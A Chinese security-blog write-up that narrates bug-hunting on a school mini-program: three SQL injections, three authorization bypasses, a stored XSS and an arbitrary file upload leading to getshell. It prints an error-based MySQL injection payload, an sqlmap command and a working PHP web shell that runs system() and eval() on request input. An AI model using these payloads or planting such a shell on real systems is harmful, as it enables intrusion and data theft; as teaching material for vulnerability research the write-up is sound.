#  证书站一个系统八个漏洞：直接getshell ！！!  
原创 zkaq-songqing  掌控安全EDU   2026-01-13 09:51  
  
扫码领资料  
  
获网安教程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp#imgIndex=0 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp#imgIndex=1 "")  
  
  
# 本文由掌控安全学院 -  songqing 投稿  
  
**来****Track安全社区投稿~**  
  
**千元稿费！还有保底奖励~（ https://bbs.zkaq.cn ）**  
# 证书站一个系统八个漏洞：直接getshell ！！!  
## 0x00 目录  
  
**证书站一个系统八个漏洞：直接getshell ！！!**  
  
0x00 目录  
  
0x01 前言介绍  
  
0x02 SQL注入*3  
  
SQL1:  
  
SQL2:  
  
SQL3:  
  
0x03 越权*3  
  
越权1:  
  
越权2:  
  
越权3:  
  
0x04 getshell~  
  
0x05 总结  
  
## 0x01 前言介绍  
  
周末闲来无事 打点证书玩玩~   
  
**居然捡到了getshell**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2q9zuCgW2kMr2SXJaE6Ytsamlr1ZDHxh1CN9Bs6I8Ngibuiak16M1vNpw/640?wx_fmt=png&from=appmsg "")  
  
感谢几位师傅分享：Schneider、FORTUNE、Born towards the sun、n0rma1playe2、君叹  
  
此次渗透测试中 发现该系统**存在 8 个漏洞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2UIrh6AYN0icXTynNyxLlHcXy0ibMQzUvN7ROkdvu6hMpwNdpTWwUqWPA/640?wx_fmt=png&from=appmsg "")  
  
分别是**3个sql注入**  
 3个越权 1个存储型xss **1个getshell**  
  
## 0x02 SQL注入*3  
  
开局先登录一手~ 随便认证了一个学生  
  
其实从这里就可以看出来 洞不少 谁家好人系统能乱认证成功啊  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2S3OR22NGiabzImnZphI8gm700T7npW3HIdNkQj9tIcSKwicTxHdKj3Gw/640?wx_fmt=png&from=appmsg "")  
  
改成老师就是未认证了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2Dfu8Z2VHiciceCQZ2qUPKxoV4xgDd2P6KEqiamHrfaVSwdoBNrbwAbCcw/640?wx_fmt=png&from=appmsg "")  
  
意思就是说 我就只能当学生呗?  
  
(我不管 我就要当管理员)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2rEy3lfic80lS6YnhiaDCuNX8Z5TLgTVy3lSMialBnCvKzvqkZEcER1KEg/640?wx_fmt=png&from=appmsg "")  
### SQL1:  
  
发现一处很可疑的接口 这里会返回我的个人信息  
  
那么思考一下 是不是会从数据库中查询我的手机号 查询数据呢?  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2jB5rLiaK1mAlK9KM5icve3ib86z61bq1oBibd3WI6iayA3KCbv3vcHgX7lA/640?wx_fmt=png&from=appmsg "")  
  
单引号报错 这里透漏了数据库为mysql  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2iab7HCMRPIJSAj56SaiaQ7QaT8Pqic65aj7XSv1pQUJAiagiaBiaKicRB04TQ/640?wx_fmt=png&from=appmsg "")  
  
那就好说了 来个时间盲注验证一下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2wK5QoTAubl1ZYSXaA5x9VvqAwZJiaEPhSZG2oSSkXbY3ejAN82ksIVg/640?wx_fmt=png&from=appmsg "")  
  
嗯~不错不错 是我想要的ms 是我想要的没有waf  
  
尝试简单的报错注入 无果  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2b3VGEGGHnIktsWDyQfaksz8X0BKzxX1oJ1W5EhWG1Dl6At5KXjCsLQ/640?wx_fmt=png&from=appmsg "")  
  
那就上个有难度的  
```
6' and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2IDQHVdzQt4jPyZHsyibvz49qDPaiaLfxOHmfb2OKYGHiaJ2ibOHo7MJfGg/640?wx_fmt=png&from=appmsg "")  
  
嗯~不错不错 又是我想要的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2BrIsnCxKykChZmib0ARIJ65hicWLlGFLz2DQ7EEJZGe2uRlExulSO1CA/640?wx_fmt=png&from=appmsg "")  
  
懒得一个个弄了 丢入sqlmap一把梭  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2nibBRK9s4XSNuxbNA3yJTFewQgEiblr7XRXMhgg2XhPT2mq3DAiaiajVmQ/640?wx_fmt=png&from=appmsg "")  
  
果然 和我想的差不多 时间盲注+布尔盲注+报错注入都可以  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2OnibO6UwAyj7T53nwTdJN3cIhJ7XowuoD3ylZ7selaHJ7mEU2vGA10A/640?wx_fmt=png&from=appmsg "")  
  
轻轻松松就能拿下一个sql注入的站 你猜它还有没有其他sql注入点?  
### SQL2:  
  
在预约处 又遇见了熟悉的phone  
  
经过刚刚那么一波 我现在看到phone就觉得有sql注入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2ETzsWzPkjSa9mg0mRI3vmEzIhpTMiaTasWibJAVYl2GnCibV3Q6fKVEKA/640?wx_fmt=png&from=appmsg "")  
  
这回的单引号让我很失望 居然没有报错  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN24FgB2vSrocZ12iaVw770Dx9icV8HUvdNqBJKZhibrMQLwlEAWPMHIV6Pw/640?wx_fmt=png&from=appmsg "")  
  
拿着刚刚的报错注入payload放入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2kSwqT2mJfcibEHhmJuLozhjpyz2hvH3gwQuJtcr16BcFibyhDdfib8WuA/640?wx_fmt=png&from=appmsg "")  
  
嗯~系统很安全 没有漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2wNvl78FxuBafEqcI0DXYH6g33U294uk972auZg5XcrHpiaiaZEL4lO2Q/640?wx_fmt=png&from=appmsg "")  
  
怎么可能啊兄弟 依旧让数据库给我睡  
  
诶唷我擦 我让你睡5s 你睡不醒了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2E2MEQAhN9reDlMAGLx7ewQpIp8E95kUJzDpzEsCicL1mpFKcuiaVINGw/640?wx_fmt=png&from=appmsg "")  
  
嘶 存在倍率问题? 我输入0.3睡了快7000ms  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2f97r3BRIEfa57vF1Jsoqe2gI0NBpDyMlfar8K6h7qqF7uVQ5353E8A/640?wx_fmt=png&from=appmsg "")  
  
看来是我想的这样了0.5 会睡10000+ms  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2ia4E3sptibD5gZUzKepVUllKNX9x6kH6AGYibXEdaR73mfsNK7PyJ8HOQ/640?wx_fmt=png&from=appmsg "")  
  
这让我不经想起了我的上一篇文章中的倍率sql注入  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2IUdWD1OlUTfNSFsAwRIWT6Mgrl10xIFTxn5mqJyQj1DfExtIfom5PQ/640?wx_fmt=png&from=appmsg "")  
  
  
感兴趣的可以去看一下 有讲解为什么会存在这种倍率延迟  
  
(  
[https://mp.weixin.qq.com/s/e3iJBVKsuiwnzn13clMVTw](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247553693&idx=1&sn=f4655e0bc0a39e7e8f257e5225e0f62d&scene=21#wechat_redirect)  
  
)  
  
好了 有时间盲注 没有waf sqlmap一把梭  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2pCrZvsv4QyWbGz8XTwPibBRXtXCKXDnI9Iz9ykBvGqV0VBvKCb2v8PQ/640?wx_fmt=png&from=appmsg "")  
  
这里教大家一个小技巧 sqlmap可以指定参数跑 对于参数较多的请求 通过-p指定参数 可以大大节省时间  
  
python sqlmap.py -u "https://example.com?id=1&phone=123&xxx=aaa&bbb=cccc" -p phone --batch --dbs  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2l3FSCceCT0iaSLU1AhPJntnmdfQyprlFnOC6g8hW52QA59SrjkvEcrw/640?wx_fmt=png&from=appmsg "")  
### SQL3:  
  
点来点去 发现可以预约以及取消预约  
  
那么咱们就盯着它的预约处打  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2H4lCia8nrREIuVt7EibiaCpeVjmkuh8l0Itfts6diaGZdWz9afdey701iaA/640?wx_fmt=png&from=appmsg "")  
  
取消预约处抓包 看到了久违的id参数 这里猜测是订单号之类的东西  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2HicBOOsfGphkCc9yP11qqbAgROASV90XZaxlctDVJibT2tUPsniavWyibw/640?wx_fmt=png&from=appmsg "")  
  
这回我猜也能猜到有sql注入 直接sqlmap一把梭  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2vs0iaNEaz7NouGXGBUUWpP4MOMj2Bk00GYWJMX3Daiaa6L1suh3PLSIg/640?wx_fmt=png&from=appmsg "")  
  
太爽了 这可是我爷爷留下来的sql注入一把锁工具  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2BGibib3ibSpmh0a6bnqohXLgNFBX7UyXjhqlGJKXOoEzkQQ1vTsADuNhw/640?wx_fmt=png&from=appmsg "")  
  
## 0x03 越权*3  
  
这时候细心的师傅可能已经发现了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2m8hWcfyPbZQNFnDk5ic0xCbdajOIEAfOialy6RibGQ5YpicSmEic4ST4aCA/640?wx_fmt=png&from=appmsg "")  
  
在预约和取消预约的请求包中 居然没有  
cookie/token  
等鉴权字段?????  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2llicl2Yk7rZrJpqicHiakVVFxVzfgO0JCrvqibiaMGMaO3nUtXyP3ML76kA/640?wx_fmt=png&from=appmsg "")  
  
本来想着有一种可能是 它这里在刚开始登录的时候 已经获取过手机号了 而且与  
openid  
 绑定了  
  
可能是登录时服务端会生成一个**会话 ID**  
（比如   
sessionId  
） 并将这个 ID 与   
手机号+openid  
 绑定后存入内存(如 Redis 或本地内存缓存)   
  
服务端通过我的**设备指纹**  
（如   
User-Agent  
 + IP  
）关联到对应的会话 ID 请求时无需显式传参 服务端自动匹配内存中的会话信息  
  
这样在后续发包的时候就不需要带上类似cookie/token的鉴权字段  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2psiaYr6Uq83dnj9wjXGRMYpPcMKicp0TWcg3lsMwu3pbyQ2vCfbicOMcQ/640?wx_fmt=png&from=appmsg "")  
  
但是转念一想 不对 这系统sql注入都3个了 大胆猜 没那么高级 **而是压根没做鉴权!!!!**  
### 越权1:  
  
本人的为586  
  
他人的为011  
  
这里先提交一个预约 抓包将手机号改为其他人的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2rxavOHkjhlUPSJiaVQAXETwTo9AKEXRZttQSEdY8IRZyj1lib4UkTnQw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2nskVEx6NvB4g8dLW9C9FTA94Y6bKQa46rEZ07EzVApARfHD5EMFFhw/640?wx_fmt=png&from=appmsg "")  
  
神奇的事情发生了 自己的号上没有出现新的预约  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN27ibOM82yrvsmWjNA0iaPsRON9SzYYAibHxU9sCDRbSf5t7fwTiciafnoktw/640?wx_fmt=png&from=appmsg "")  
  
可以从图中看到自己这边没有"取消预约"的按钮 说明这些都是之前的预约 并不是刚预约的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2fCJVicMNumPmTol8iabsS23iapqsrnvhpJibib5ZB9ic7kxzJ8pVt13tuGtw/640?wx_fmt=png&from=appmsg "")  
  
拿来他人的手机一看 诶您猜怎么着 直接给他人预约了一个  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2EZhVKggIMOcZibvZEM2neyicHuDvC7rHtkBpCyFqkNia7rKvUR8KwI7xQ/640?wx_fmt=png&from=appmsg "")  
### 越权2:  
  
还是那句话 既然可以预约 那就可以取消预约  
  
预约可以越权 取消预约也可以  
  
自己先随便预约一个 开启抓包拦截 点击取消预约  
  
381726  
为本人预约的订单号 381723  
为他人预约的订单号  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2nqKT3XXzsvmCTCC1RauMxE0zfLJD0fX8IRSoWLItg2KIN04XPmyjnw/640?wx_fmt=png&from=appmsg "")  
  
将ind改为381723  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2gzPdQVWVPlRaAe0xibkfZwjCZFticxOaC7piaxy137N8aHn5BRSFe5lMQ/640?wx_fmt=png&from=appmsg "")  
  
再次看自己号上的预约还在  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2GibMic5tAEkWH9N4SBD46Moic5cJLjCGh3QoRcARf2xImcaDx7NVcbHuA/640?wx_fmt=png&from=appmsg "")  
  
嘿嘿嘿 嘿嘿 那么他人的订单就~~~  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2MoxxHxhnuvvXxdo4wfKaHbSESvxg9lS4HD9mKRZOPkdGuy48o1WCqg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2fIBmBx24nFJYJOAHKUT1P6GZGagVDsPLDycPlBibPKfD41yb0LSo1DQ/640?wx_fmt=png&from=appmsg "")  
### 越权3:  
  
最有意思的来了 学校永远也想不到 一个小小的越权能造成getshell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2e8y8XEuw3271QF1kfNLhicOIw5xhAg3LpCXeWfAthCHH7CjTCvhKg1w/640?wx_fmt=png&from=appmsg "")  
  
点击乘车卡页面 发现这里除了有两个获取手机号的数据包 还有一个chaxunkaiqi.php  
(查询开启.php)  
  
并且响应为关闭 那么我就叛逆 我改成开启  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2UgW7UeTY3SKhTNU6xd853bkUJ7jLaJvNFKzicMUhBGSYfTcw2HnMNwQ/640?wx_fmt=png&from=appmsg "")  
  
改完之后页面也是发生了翻天覆地的变化  
  
直接给我开了个新功能点啊哥们  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2Mic5ZgJP9IprsFkTEU989c6ctCiaBLEumRJzHks6DgV0U4RFuTzJr5ug/640?wx_fmt=png&from=appmsg "")  
  
(我正愁没功能点测了呢.........)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2xLSB97F2ZzoDVhYQu94BLaVQAlhjtclgBx0F8VwaJwVcwvcak7P0og/640?wx_fmt=png&from=appmsg "")  
  
## 0x04 getshell~  
  
上传图片处 存在任意文件上传漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2DChcxbnibJxsg3dEnWjMrdeVl4LcaicVMwMXzeHHLMias7GicRLmHVfaQg/640?wx_fmt=png&from=appmsg "")  
  
直接狠狠地塞入一句话木马  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN28WR1TuXNVicGHRgRMSBAxUYYibKkYCaRQRGbIQ17EqvWkBc36JIjmq7g/640?wx_fmt=png&from=appmsg "")  
  
正当我要美美的奖励自己的时候  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2KrgvWxKmNI9EyAo1ayJ4nwwCFMekgjYFtb5VBJ7QF7X1ngJeU8NqDw/640?wx_fmt=png&from=appmsg "")  
  
发现没给上传路径 而且上传的文件有后缀 排除是存储桶  
  
(漏洞这么多的站大概也不会上这高级玩意)  
  
最终也是拼出来了但是.....  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2loHBlhynCg9ujBUh7XUuqbftZDiaPnv7RcnBqZhwftaNibEstI0k78tg/640?wx_fmt=png&from=appmsg "")  
  
似乎是被杀掉了 再次刷新就成了404了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2LvD3r8IaJJKkVnglBRaTyWxJMaosibNZFAevMJFL6W7u74ht03chz5w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2lH6uAYynt2nonmhJYsqZPfmjhYkpC0EtP2f3BTicpHH0aOeiaciarpbtg/640?wx_fmt=png&from=appmsg "")  
  
最后也是上了稍微复杂点的马+混淆  
```
<?php
  if (isset($_GET['cmd'])) {
  echo "<pre>";
system($_GET['cmd']); 
echo "</pre>";
}
@eval($_POST['pass']); 
?>
```  
  
重新上传后 访问为空白页的时候 不要怀疑 就是成功了!!!  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2k9VMaYBE8K1SID4sUhwtc8AMqckWW5jb9QGpGlZ2pGckOqicO2dMoWQ/640?wx_fmt=png&from=appmsg "")  
  
成功getshell~  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2ibvK3ODg8hzX9fLVT5saJWoBmWHBh0MUHjJyEmUuY9Kianc8RbXP08iaQ/640?wx_fmt=png&from=appmsg "")  
  
  
还是最高权限  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2deOdm1oJ8jDoUXJwVeEqXMtddfiaZQ42B09ygaGW8XjdgTjiaWkEqHQA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2fYJkupPPbQfTAWC5xTGP9EFlu1ibEZTbwRTtkmDjeiaIFlOPAShHCCxg/640?wx_fmt=png&from=appmsg "")  
  
最后在上传一份存储型xss 再赚1rank  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2icBg6zmbTDdNr9EzHYlVgmFJu5F0tibOUfGxCbTUe5mwaicUsrXjjvMmg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2d0BaWJ1EwJgUjFvWWzicQIRt8Oogr2zjWA4YWaDADSDZBSWyUmP2JQA/640?wx_fmt=png&from=appmsg "")  
  
## 0x05 总结  
  
其实从这篇文章可以看出来 证书站也没有想象中的那么难挖 本篇文章中的挖洞都是比较基础的一些手法 重要的是对于**脆弱资产的收集**  
以及一些**挖掘的思路**  
 比如从一开始 我在看这个小程序的功能点的时候 就已经感觉有洞了 开局居然可以直接认证为学生身份 而且请求包中没有做加密 用手机号一键登录的时候 直接带了小程序的iv和session_key 配合encryptdata可以直接解密数据 从这些一点点的都可以判断出该小程序比较好挖 各位师傅在挖洞过程中 可以多关注一下**正常的功能点是否真的正常**  
 以及是否有cookie等字段做校验 当然也要大胆的猜测 猜测功能点的参数 猜测系统的后端开发逻辑 猜测那些看起来可能很不正常的地方 **挖洞就是要大胆猜测**  
 就是要与常人不同 与开发做对抗 祝各位师傅在接下来的挖洞中能够次次出洞~  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vco1qB08ECDMBx1bkgGSdPN2h0eTBUZBOK37hsf4ywZwRhA33J1SBw7DYQ1fhHqDYicDd4dgXEEWwGg/640?wx_fmt=png&from=appmsg "")  
  
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，  
  
所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=34 "")  
  
**没看够~？欢迎关注！**  
  
  
**分享本文到朋友圈，可以凭截图找老师领取**  
  
上千**教程+工具+交流群+靶场账号**  
哦  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp#imgIndex=35 "")  
  
******分享后扫码加我！**  
  
**回顾往期内容**  
  
[网络安全人员必考的几本证书！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247520349&idx=1&sn=41b1bcd357e4178ba478e164ae531626&chksm=fa6be92ccd1c603af2d9100348600db5ed5a2284e82fd2b370e00b1138731b3cac5f83a3a542&scene=21#wechat_redirect)  
  
  
[文库｜内网神器cs4.0使用说明书](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247519540&idx=1&sn=e8246a12895a32b4fc2909a0874faac2&chksm=fa6bf445cd1c7d53a207200289fe15a8518cd1eb0cc18535222ea01ac51c3e22706f63f20251&scene=21#wechat_redirect)  
  
  
[重生HW之感谢客服小姐姐带我进入内网遨游](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247549901&idx=1&sn=f7c9c17858ce86edf5679149cce9ae9a&scene=21#wechat_redirect)  
  
  
[手把手教你CNVD漏洞挖掘 + 资产收集](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247542576&idx=1&sn=d9f419d7a632390d52591ec0a5f4ba01&token=74838194&lang=zh_CN&scene=21#wechat_redirect)  
  
  
[【精选】SRC快速入门+上分小秘籍+实战指南](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247512593&idx=1&sn=24c8e51745added4f81aa1e337fc8a1a&chksm=fa6bcb60cd1c4276d9d21ebaa7cb4c0c8c562e54fe8742c87e62343c00a1283c9eb3ea1c67dc&scene=21#wechat_redirect)  
  
##     代理池工具撰写 | 只有无尽的跳转，没有封禁的IP！  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=36 "")  
  
点赞+在看支持一下吧~感谢看官老爷~   
  
你的点赞是我更新的动力  
  
  
